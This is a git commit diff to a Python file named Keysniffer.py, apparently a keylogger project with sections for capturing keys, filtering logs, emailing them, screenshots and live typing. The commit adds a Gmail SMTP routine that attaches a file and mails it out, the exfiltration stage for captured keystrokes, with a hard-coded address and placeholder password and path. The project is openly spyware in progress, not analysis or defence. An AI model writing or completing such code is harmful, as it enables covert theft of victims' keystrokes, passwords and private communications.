68e0572658a5a56867d2fcd83b10b78d90b7c784
Cyb3rTyr <marquessarodrigo@gmail.com>
2024-12-31 13:41:52 +0100

    demo - email

--- Keysniffer.py
+++ Keysniffer.py
@@ -1,5 +1,6 @@
 # ===================================================== Basic keylogger ================================================
 
+
 import keyboard
 
 # Defining the text file name and path
@@ -18,6 +19,7 @@ while True:
 
 
 # ===================================================== Filtering data =======================================================
+
 
 # import json
 # import os
@@ -51,13 +53,86 @@ while True:
 
 # print(f"Filtered results saved to {output_file_path}")
 
+
 # ===================================================== Sending by email =========================================================
+
+
+# this code was tacken from : https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/?ref=lbp
+
+# Python code to illustrate Sending mail with attachments
+# from your Gmail account
+
+# libraries to be imported
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+
+fromaddr = "7unkym0nk3y@gmail.com"
+toaddr = "7unkym0nk3y@gmail.com"
+
+# instance of MIMEMultipart
+msg = MIMEMultipart()
+
+# storing the senders email address
+msg["From"] = fromaddr
+
+# storing the receivers email address
+msg["To"] = toaddr
+
+# storing the subject
+msg["Subject"] = "test"
+
+# string to store the body of the mail
+body = "Body_of_the_mail"
+
+# attach the body with the msg instance
+msg.attach(MIMEText(body, "plain"))
+
+# open the file to be sent
+filename = "File_name_with_extension"
+attachment = open("Path of the file", "rb")
+
+# instance of MIMEBase and named as p
+p = MIMEBase("application", "octet-stream")
+
+# To change the payload into encoded form
+p.set_payload((attachment).read())
+
+# encode into base64
+encoders.encode_base64(p)
+
+p.add_header("Content-Disposition", "attachment; filename= %s" % filename)
+
+# attach the instance 'p' to instance 'msg'
+msg.attach(p)
+
+# creates SMTP session
+s = smtplib.SMTP("smtp.gmail.com", 587)
+
+# start TLS for security
+s.starttls()
+
+# Authentication
+s.login(fromaddr, "Password_of_the_sender")
+
+# Converts the Multipart msg into a string
+text = msg.as_string()
+
+# sending the mail
+s.sendmail(fromaddr, toaddr, text)
+
+# terminating the session
+s.quit()
 
 
 # ===================================================== Taking screenshots =======================================================
 
 
 # ===================================================== Typing live ==============================================================
+
 
 import socket
 
